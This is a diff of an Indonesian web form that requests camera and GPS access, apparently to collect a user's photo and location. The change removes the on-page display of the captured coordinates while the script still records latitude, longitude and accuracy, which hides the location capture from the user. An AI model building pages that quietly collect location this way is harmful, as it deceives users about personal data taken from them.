@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Input Data Lokasi dengan GPS</title>
+    <title>Input Data Lokasi</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 600px;
+            max-width: 500px;
             margin: 0 auto;
             padding: 20px;
             background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
@@ -23,7 +23,7 @@
             color: #4285f4;
             text-align: center;
             margin-bottom: 25px;
-            font-size: 28px;
+            font-size: 24px;
         }
         .form-group {
             margin-bottom: 20px;
@@ -118,16 +118,6 @@
         .permission-btn:hover {
             background-color: #0b8046;
         }
-        .gps-data {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        .gps-data p {
-            margin: 5px 0;
-        }
         .progress-container {
             height: 10px;
             width: 100%;
@@ -143,11 +133,18 @@
             width: 0%;
             transition: width 0.5s ease-in-out;
         }
+        .icon {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 15px;
+            color: #4285f4;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Input Data Lokasi dengan GPS</h1>
+        <div class="icon">📸📍</div>
+        <h1>Input Data Lokasi</h1>
         
         <div class="instructions">
             <p>Silakan izinkan akses kamera dan lokasi GPS, kemudian isi data dan kirim formulir.</p>
@@ -159,13 +156,6 @@
         
         <div class="progress-container" id="progress-container">
             <div class="progress-bar" id="progress-bar"></div>
-        </div>
-        
-        <div class="gps-data" id="gps-data">
-            <h3>Data Lokasi Terdeteksi:</h3>
-            <p id="latitude">Latitude: Sedang mengambil data...</p>
-            <p id="longitude">Longitude: Sedang mengambil data...</p>
-            <p id="accuracy">Akurasi: Sedang mengambil data...</p>
         </div>
         
         <div class="form-group">
@@ -194,10 +184,6 @@
         const statusDiv = document.getElementById('status');
         const namaInput = document.getElementById('nama');
         const alamatInput = document.getElementById('alamat');
-        const gpsDataDiv = document.getElementById('gps-data');
-        const latitudeEl = document.getElementById('latitude');
-        const longitudeEl = document.getElementById('longitude');
-        const accuracyEl = document.getElementById('accuracy');
         const progressContainer = document.getElementById('progress-container');
         const progressBar = document.getElementById('progress-bar');
         
@@ -317,12 +303,6 @@
                         longitude = position.coords.longitude;
                         accuracy = position.coords.accuracy;
                         
-                        // Tampilkan data GPS
-                        latitudeEl.textContent = `Latitude: ${latitude}`;
-                        longitudeEl.textContent = `Longitude: ${longitude}`;
-                        accuracyEl.textContent = `Akurasi: ${accuracy} meter`;
-                        gpsDataDiv.style.display = 'block';
-                        
                         resolve();
                     },
                     (error) => {
@@ -403,7 +383,6 @@
                     latitude = null;
                     longitude = null;
                     accuracy = null;
-                    gpsDataDiv.style.display = 'none';
                     submitBtn.disabled = true;
                     
                 } else {
